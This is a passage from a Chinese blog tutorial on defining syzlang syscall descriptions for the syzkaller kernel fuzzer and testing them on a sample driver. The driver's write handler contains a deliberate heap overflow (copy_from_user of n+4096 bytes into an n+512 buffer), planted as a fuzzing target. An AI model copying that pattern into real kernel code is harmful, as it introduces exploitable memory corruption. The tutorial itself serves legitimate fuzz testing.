文件，表示该文件中使用的常量或定义值来自哪些文件。实际上，syzkaller 在解析完 kernel header 文件后，会将其存储到 <code>sys.txt.const</code> 文件中，可以随意添加 <code>include &lt;hello/world&gt;</code> 并编译观察，编译后并不会报错，因为 syzlang 解析器根本不会处理这一部分：</p><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs openscad"><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/socket.h&gt;</span><br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/ptrace.h&gt;</span><br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/resource.h&gt;</span><br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/stat.h&gt;</span><br>...<br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;hello/world&gt;</span><br></code></pre></td></tr></table></figure><p>解析 header 文件后生成的 <code>sys.txt.const</code> 文件可能包含如下内容，这是一些宏展开的值或常量：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ADDR_COMPAT_LAYOUT <span class="hljs-operator">=</span> <span class="hljs-number">2097152</span><br>ADDR_LIMIT_32BIT <span class="hljs-operator">=</span> <span class="hljs-number">8388608</span><br>ADDR_LIMIT_3GB <span class="hljs-operator">=</span> <span class="hljs-number">134217728</span><br>ADDR_NO_RANDOMIZE <span class="hljs-operator">=</span> <span class="hljs-number">262144</span><br>ADJ_ESTERROR <span class="hljs-operator">=</span> <span class="hljs-number">8</span><br>...<br></code></pre></td></tr></table></figure><p>接下来会定义一些类型，比如 <code>alignptr</code>、<code>align32</code> 和 <code>align64</code>，这些类型会接收另一个类型 <code>T</code> 并自动对齐到特定字节：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> alignptr[<span class="hljs-type">T</span>] &#123;<br>v<span class="hljs-type">T</span><br>&#125; [align[<span class="hljs-type">PTR_SIZE</span>]]<br><br><span class="hljs-keyword">type</span> align32[<span class="hljs-type">T</span>] &#123;<br>v<span class="hljs-type">T</span><br>&#125; [align[4]]<br><br><span class="hljs-keyword">type</span> align64[<span class="hljs-type">T</span>] &#123;<br>v<span class="hljs-type">T</span><br>&#125; [align[8]]<br></code></pre></td></tr></table></figure><p>类型定义语法类似于 C 的 <code>typedef</code>，而 <code>[0:65]</code> 表示该类型的值范围是 0 到 65：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">signalno </span>int32[<span class="hljs-number">0</span>:<span class="hljs-number">65</span>]<br><span class="hljs-keyword">type</span> <span class="hljs-type">signalnoptr </span>intptr[<span class="hljs-number">0</span>:<span class="hljs-number">65</span>]<br>...<br></code></pre></td></tr></table></figure><p>接着是定义 syscall 格式的部分，包括 <code>open()</code> 和 <code>openat()</code> 的参数与返回值。<code>$dir</code> 表示 <code>open()</code> 的一个特定格式，<code>sock_fprog</code> 定义了一个新的结构体，<code>open_flags</code> 定义了一个值集合。参数部分以 <code>open()</code> 为例：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])</span></span> fd<br>open<span class="hljs-variable">$dir</span>(file ptr<span class="hljs-selector-attr">[in, filename]</span>, flags flags<span class="hljs-selector-attr">[open_flags]</span>, mode flags<span class="hljs-selector-attr">[open_mode]</span>) fd_dir<br><br>openat<span class="hljs-variable">$dir</span>(...) fd_dir<br><span class="hljs-function"><span class="hljs-title">openat</span><span class="hljs-params">(...)</span></span> fd<br><br>sock_fprog &#123;<br>lenlen<span class="hljs-selector-attr">[filter, int16]</span><br><span class="hljs-attribute">filter</span>ptr[in, array[sock_filter]]<br>&#125;<br><br>open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br></code></pre></td></tr></table></figure><ul><li><code>file</code>、<code>flags</code> 和 <code>mode</code> 是参数的名称，<code>fd</code> 是返回值的名称。</li><li><code>in</code> 和 <code>out</code> 用来定义数据流的顺序，<code>in</code> 表示输入数据，<code>out</code> 表示输出结果。</li><li><code>ptr</code> 和 <code>flags</code> 则是参数类型，<code>ptr</code> 表示指向某对象（如 <code>filename</code>）的指针，可以额外定义指针属性，而 <code>flags</code> 则表示一组数值，在变异时会从中选择一个或多个作为 <code>flags</code> 参数。</li><li><code>filename</code> 是 <code>string</code> 类型的特例，表示可以在执行时产生合法的文件名。</li></ul><p>在 <code>sys.txt.const</code> 文件中，还定义了不同指令集下的 syscall 编号：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">__NR_acct = 51, amd64:163, arm64:riscv64:89, mips64le:5158<br>__NR_alarm = 27, amd64:37, arm64:riscv64:???, mips64le:5037<br>__NR_brk = 45, amd64:12, arm64:riscv64:214, mips64le:5012<br>...<br></code></pre></td></tr></table></figure><hr><p>除了 <code>sys.txt</code> 文件外，<code>sys/linux/</code> 目录下还有许多 <code>*.txt</code> 文件，<code>sys.txt</code> 定义了更多通用的 syscall 格式，而其他 <code>*.txt</code> 文件则定义了与子系统通信的 syscall。例如，<code>bpf.txt</code> 定义了与 Linux eBPF 系统交互的 syscall。</p><p>修改完这些文件后，可以执行以下命令来更新：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bin/syz-sysgen<br></code></pre></td></tr></table></figure><p>实际上，<code>syz-sysgen</code> 就是 syzlang 的解析器，它会读取这些 “源代码”，并生成 “输出文件”，例如 <code>sys/linux/gen/amd64.go</code>。不同指令集与操作系统的格式会生成对应的文件，如 <code>sys/$OS/gen/$INSN.go</code>。下面是 <code>amd64.go</code> 的一部分，可以清楚看到 syzlang 解析器（即 <code>syz-sysgen</code>）所做的操作：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> gen<br><br><span class="hljs-keyword">import</span> . <span class="hljs-string">&quot;github.com/google/syzkaller/prog&quot;</span><br><span class="hljs-keyword">import</span> . <span class="hljs-string">&quot;github.com/google/syzkaller/sys/linux&quot;</span><br><br><span class="hljs-comment">// RegisterTarget() 会向 fuzzer 注册 Linux AMD64 的 syscall 格式、规则以及常数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>    RegisterTarget(&amp;Target&#123;OS: <span class="hljs-string">&quot;linux&quot;</span>, Arch: <span class="hljs-string">&quot;amd64&quot;</span>, Revision: revision_amd64, PtrSize: <span class="hljs-number">8</span>, PageSize: <span class="hljs-number">4096</span>, NumPages: <span class="hljs-number">4096</span>, DataOffset: <span class="hljs-number">536870912</span>, LittleEndian: <span class="hljs-literal">true</span>, ExecutorUsesShmem: <span class="hljs-literal">true</span>, Syscalls: syscalls_amd64, Resources: resources_amd64, Consts: consts_amd64&#125;, types_amd64, InitTarget)<br>&#125;<br><br><span class="hljs-comment">// resource，像是 value 范围</span><br><span class="hljs-keyword">var</span> resources_amd64 = []*ResourceDesc&#123;<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES16&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES16&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES32&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES32&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES64&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES64&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES8&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES8&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;IMG_DEV_VIRTADDR&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;IMG_DEV_VIRTADDR&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">0</span>&#125;&#125;,<br>    ...<br>&#125;<br><br><span class="hljs-comment">// syscall，包含 number 以及传入的参数</span><br><span class="hljs-keyword">var</span> syscalls_amd64 = []*Syscall&#123;<br>    &#123;NR:<span class="hljs-number">43</span>,Name:<span class="hljs-string">&quot;accept&quot;</span>,CallName:<span class="hljs-string">&quot;accept&quot;</span>,Args:[]Field&#123;<br>        &#123;Name:<span class="hljs-string">&quot;fd&quot;</span>,Type:Ref(<span class="hljs-number">11387</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peer&quot;</span>,Type:Ref(<span class="hljs-number">10173</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peerlen&quot;</span>,Type:Ref(<span class="hljs-number">10453</span>)&#125;,<br>    &#125;,Ret:Ref(<span class="hljs-number">11387</span>)&#125;,<br>    &#123;NR:<span class="hljs-number">43</span>,Name:<span class="hljs-string">&quot;accept$alg&quot;</span>,CallName:<span class="hljs-string">&quot;accept&quot;</span>,Args:[]Field&#123;<br>        &#123;Name:<span class="hljs-string">&quot;fd&quot;</span>,Type:Ref(<span class="hljs-number">11390</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peer&quot;</span>,Type:Ref(<span class="hljs-number">5022</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peerlen&quot;</span>,Type:Ref(<span class="hljs-number">5022</span>)&#125;,<br>    &#125;,Ret:Ref(<span class="hljs-number">11391</span>)&#125;,<br>    ...<br>&#125;<br><br><span class="hljs-comment">// consts，也就是常数</span><br><span class="hljs-keyword">var</span> consts_amd64 = []ConstValue&#123;<br>    &#123;<span class="hljs-string">&quot;ABS_CNT&quot;</span>,<span class="hljs-number">64</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ABS_MAX&quot;</span>,<span class="hljs-number">63</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ACL_EXECUTE&quot;</span>,<span class="hljs-number">1</span>&#125;,<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>通过 <code>RegisterTarget()</code> 函数，fuzzer 注册了用户定义的 Linux AMD64 目标的 syscall 格式。</p><h3 id="描述系统调用"><a href="#描述系统调用" class="headerlink" title="描述系统调用"></a>描述系统调用</h3><p>定制（即对新的内核接口，增加系统调用描述文件）是一个比较繁琐的国产，官方给了如下文档用作参考：</p><ul><li>txt声明文件的方法： <a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md">syscall description语法</a></li><li>一些Linux下的 syscall description：<a href="https://github.com/google/syzkaller/tree/master/sys/linux">现有可参考的声明文件</a></li></ul><p>以下为例，从系统调用<code>open</code>函数开始，它的函数定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">int</span> flags, <span class="hljs-type">mode_t</span> mode)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>flags：<code>O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</code></li><li>mode：<code>S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</code></li></ul><p>用syzlang来描述它：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">resource fd_test<span class="hljs-comment">[fd]</span>  <br><span class="hljs-keyword">open</span>(file ptr<span class="hljs-comment">[in, filename]</span>, flags flags<span class="hljs-comment">[open_flags]</span>, mode flags<span class="hljs-comment">[open_mode]</span>) fd_test  <br># 或  <br># <span class="hljs-keyword">open</span>(file ptr<span class="hljs-comment">[in, string<span class="hljs-comment">[&quot;/dev/xxx&quot;]</span>]</span>, flags flags<span class="hljs-comment">[open_flags]</span>, mode flags<span class="hljs-comment">[open_mode]</span>) fd_test<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">include &lt;linux/fs.h&gt;<br><br><span class="hljs-keyword">open</span>$proc(<span class="hljs-keyword">file</span> <span class="hljs-keyword">ptr</span>[in, <span class="hljs-built_in">string</span>[<span class="hljs-string">&quot;/proc/test&quot;</span>]], flags flags[proc_open_flags], <span class="hljs-keyword">mode</span> flags[proc_open_mode]) fd<br><span class="hljs-keyword">read</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[out], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf]) <span class="hljs-built_in">len</span>[buf]<br><span class="hljs-keyword">write</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[in], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf]) <span class="hljs-built_in">len</span>[buf]<br><span class="hljs-keyword">close</span>$proc(fd fd)<br><br>proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br>proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>系统调用的声明包含调用名、参数和返回值。格式如下：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">SyscallName$<span class="hljs-keyword">Type</span><br></code></pre></td></tr></table></figure><ul><li><ul><li><code>$</code> 前是系统调用名（如 <code>open</code>）；</li></ul></li><li><ul><li><code>$</code> 后是自定义的调用类型（如 <code>proc</code>），名称可以自定义，用于限制调用行为；</li></ul></li><li><ul><li>参数格式如下：</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">参数名 类型<span class="hljs-selector-attr">[限制]</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mode flags<span class="hljs-selector-attr">[proc_open_mode]</span><br></code></pre></td></tr></table></figure><p>表示 <code>mode</code> 是一个 <code>flags</code> 类型，限制为 <code>proc_open_mode</code> 中的值。</p><p>在我们的例子中，堆溢出是通过向 <code>/proc/test</code> 写入数据触发的，所以需要将 <code>open</code> 的 <code>file</code> 参数限定为 <code>&quot;/proc/test&quot;</code>。</p><p>然后重新编译syzkaller</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">make clean<br>make bin/syz-extract<br>bin/syz-extract -os linux -arch amd64 -sourcedir /PATH/TO/LINUX/SOURCE sys/YOUR_SYSCALL.txt<br>make all<br></code></pre></td></tr></table></figure><ul><li><ul><li><code>-arch</code>：目标架构（如 amd64）</li></ul></li><li><ul><li><code>-sourcedir</code>：Linux 内核源码所在路径</li></ul></li></ul><h4 id="拷贝binary到测试机"><a href="#拷贝binary到测试机" class="headerlink" title="拷贝binary到测试机"></a>拷贝binary到测试机</h4><p>启动你的虚拟机后，在宿主机 syzkaller 目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp -P $(YOUR_PORT) -i ~/.ssh/rsa -r syzkaller/bin root@127.0.0.1:$(YOUR_PATH)<br></code></pre></td></tr></table></figure><ul><li><code>$(YOUR_PORT)</code> 是你启动 QEMU 时指定的端口；</li><li><code>$(YOUR_PATH)</code> 是 VM 内配置的目录路径。</li></ul><h3 id="将描述信息编译进行内核"><a href="#将描述信息编译进行内核" class="headerlink" title="将描述信息编译进行内核"></a>将描述信息编译进行内核</h3><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>这里我们使用一个漏洞驱动来测试我们的 syzkaller 是否开源 fuzz 出来。</p><ul><li>初始加载驱动时，会在<code>/proc</code>文件夹下创建文件proc。而针对于 proc 的读写操作，内核实际会调用<code>proc_*</code>系列函数俩进行处理。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/slab.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MY_DEV_NAME <span class="hljs-string">&quot;test&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_FLAG <span class="hljs-string">&quot;PROC_DEV&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_read</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_write</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proc_open</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *proc_inode, <span class="hljs-keyword">struct</span> file *proc_file)</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">a</span> =</span> &#123;<br>                                .open = proc_open,<br>                                .read = proc_read,<br>                                .write = proc_write,<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">mod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_dir_entry</span> *<span class="hljs-title">test_entry</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span> =</span> &amp;a;<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:proc init start!\n&quot;</span>);<br><br><span class="hljs-comment">//创建 proc</span><br>    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, <span class="hljs-literal">NULL</span>, proc_fops);<br>    <span class="hljs-keyword">if</span>(!test_entry)<br>       printk(DEBUG_FLAG<span class="hljs-string">&quot;:there is somethings wrong!\n&quot;</span>);<br>    <br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:proc init over!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_read</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:finish copy_from_use,the string of newbuf is&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_write</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span>  <br>&#123;  <br>    <span class="hljs-type">char</span> *c = kmalloc(n + <span class="hljs-number">512</span>, GFP_KERNEL);  <br>    <br><span class="hljs-comment">//溢出，原先只有 512 字节，但是复制了 4096</span><br>    <span class="hljs-type">size_t</span> size = copy_from_user(c, proc_user, n + <span class="hljs-number">4096</span>);  <br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:into write %ld!\n&quot;</span>, size);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">proc_open</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *proc_inode, <span class="hljs-keyword">struct</span> file *proc_file)</span><br>&#123;<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:into open!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>module_init(mod_init);<br></code></pre></td></tr></table></figure><h3 id="编译进内核"><a href="#编译进内核" class="headerlink" title="编译进内核"></a>编译进内核</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">下载源代码至 linux/drivers/char/test.c</span>  <br>proxychains wget -v https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/raw/master/docs/harbian_qa/fuzz_testing/test.c -O linux/drivers/char/test.c  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改 Makefile</span>   <br>echo &quot;obj-y += test.o&quot; &gt;&gt; linux/drivers/char/Makefile  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">尝试编译</span>  <br>make<br></code></pre></td></tr></table></figure><p>在<code>/proc/test</code>下可以找到目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /proc/test<br></code></pre></td></tr></table></figure><h3 id="配置-syzkaller规则"><a href="#配置-syzkaller规则" class="headerlink" title="配置 syzkaller规则"></a>配置 syzkaller规则</h3><p>在<code>syzkaller/sys/linux/</code>创建一个对应于这个漏洞驱动的处理规则<code>test.txt</code>，内容如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">include &lt;linux/fs.h&gt;  <br>   <br><span class="hljs-keyword">open</span>$proc(<span class="hljs-keyword">file</span> <span class="hljs-keyword">ptr</span>[in, <span class="hljs-built_in">string</span>[<span class="hljs-string">&quot;/proc/test&quot;</span>]], flags flags[proc_open_flags], <span class="hljs-keyword">mode</span> flags[proc_open_mode]) fd  <br><span class="hljs-keyword">read</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[out], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf])  <br><span class="hljs-keyword">write</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[in], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf])  <br><span class="hljs-keyword">close</span>$proc(fd fd)  <br>   <br>proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE  <br>proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>在 syzkaller 项目根目录下执行以下命令以创建对应的.const文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bin/syz-extract -os linux -sourcedir &quot;/usr/class/linux&quot; -arch amd64 test.txt<br></code></pre></td></tr></table></figure><p>重建 syzkaller</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">bin/syz-sysgen<br>make all<br></code></pre></td></tr></table></figure><h3 